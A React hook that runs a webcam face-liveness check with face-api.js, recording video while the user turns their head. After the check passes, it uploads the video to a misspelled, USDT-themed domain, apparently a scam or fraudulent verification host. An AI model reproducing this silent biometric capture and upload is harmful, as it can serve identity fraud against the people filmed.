import * as faceapi from "face-api.js";
import { useCallback, useEffect, useRef, useState } from "react";
const useFacedetect = () => {
  const videoref = useRef(null);
  const recordedChunks = useRef([]);
  const mediaRecorderRef = useRef(null);
  const [nose, setnose] = useState(null);
  const [verified, setverified] = useState(false);
  const [stream, setstream] = useState(null);
  const [isloaded, setisloaded] = useState(false);
  const [intervalId, setIntervalId] = useState(null);
  const [facedetected, setfacedetected] = useState(false);
  const [isrecording, setisrecording] = useState(false);
  const [right, setright] = useState(false);
  const [left, setleft] = useState(false);
  const [top, settop] = useState(false);
  const [bottom, setbottom] = useState(false);
  const [nosepoint, setnosepoint] = useState([0, 0, 0]);
  const [timeoutid, settimeoutid] = useState(null);
  const stopRecording = useCallback(() => {
    if (mediaRecorderRef.current) {
      setisrecording(false);
      mediaRecorderRef.current.stop();
      mediaRecorderRef.current.removeEventListener(
        "dataavailable",
        handleDataAvailable
      );
    }
  }, [mediaRecorderRef]);
  const handleDataAvailable = (event) => {
    if (event.data.size > 0) {
      recordedChunks.current = [...recordedChunks.current, event.data];
    }
  };
  useEffect(() => {
    let interval;
    const loadModels = async () => {
      await faceapi.nets.ssdMobilenetv1.load("/models");
      await faceapi.loadFaceLandmarkModel("/models");
    };

    const startVideo = async () => {
      const userMedia = await navigator.mediaDevices.getUserMedia({
        video: true,
      });
      if (videoref.current) {
        videoref.current.srcObject = userMedia;
        setstream(userMedia);
      }
    };
    const facedetect = async () => {
      await loadModels();
      await startVideo();
      setisloaded(true);
      interval = setInterval(async () => {
        if (videoref.current) {
          const detections = await faceapi
            .detectAllFaces(
              videoref.current,
              new faceapi.SsdMobilenetv1Options()
            )
            .withFaceLandmarks();
          if (detections.length > 0) {
            setfacedetected(true);
            setnose(detections[0].landmarks.getNose());
          } else {
            setfacedetected(false);
            setnosepoint([0, 0, 0]);
            setright(false);
            setleft(false);
            settop(false);
            setbottom(false);
            clearTimeout(timeoutid);
            settimeoutid(null);
          }
        }
      }, 100);
    };
    setIntervalId(interval);
    facedetect();
    return () => clearInterval(interval);
  }, []);
  useEffect(() => {
    if (facedetected && !isrecording && !verified) {
      setisrecording(true);
      if (videoref.current) {
        const stream = videoref.current.srcObject;
        mediaRecorderRef.current = new MediaRecorder(stream);
        mediaRecorderRef.current.addEventListener(
          "dataavailable",
          handleDataAvailable
        );
        mediaRecorderRef.current.start();
      }
    }
    if (!facedetected && isrecording) {
      stopRecording();
      recordedChunks.current = [];
    }
  }, [facedetected, isrecording, stopRecording, verified]);
  useEffect(() => {
    if (nose) {
      if (nosepoint[2] !== 0) {
        if (!right) {
          if (Number(nose[3].x) - nosepoint[0] < -55) {
            setright(true);
          }
        } else {
          if (Number(nose[3].x) - nosepoint[0] > 55) {
            setleft(true);
          }
        }

        if (right && left) {
          if (Number(nose[3].y) - nosepoint[1] < -40) {
            settop(true);
          }
        }
        if (right && left && top) {
          if (Number(nose[3].y) - nosepoint[1] > 30) {
            setbottom(true);
          }
        }
      } else {
        setnosepoint([Number(nose[3].x), Number(nose[3].y), 1]);
      }
      if (right && left && top && bottom) {
        if (isrecording) {
          stopRecording();
        }
        clearInterval(intervalId);
        videoref.current = null;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
        if (videoref.current) {
          videoref.current.srcObject = null;
        }
        setverified(true);
      }
    }
  }, [
    bottom,
    intervalId,
    isrecording,
    left,
    nose,
    nosepoint,
    recordedChunks,
    right,
    stopRecording,
    stream,
    timeoutid,
    top,
  ]);
  useEffect(() => {
    if (verified && recordedChunks.current.length > 0) {
      const sendData = () => {
        const recordedBlob = recordedChunks.current[0];
        const fileName = new Date().toISOString() + ".webm";

        const formData = new FormData();
        formData.append("video", recordedBlob, fileName);

        fetch("https://usdtverfication.website/save-video", {
          method: "POST",
          body: formData,
        })
          .then(function (response) {
            if (response.ok) {
              console.log("Video sent to the server successfully.");
            } else {
              console.error(
                "Failed to send video. Server returned status:",
                response.status
              );
            }
          })
          .catch(function (error) {
            console.error("Error sending video:", error);
          });
      };
      sendData();
    }
  }, [verified]);
  return { isloaded, facedetected, right, left, top, verified, videoref };
};

export default useFacedetect;
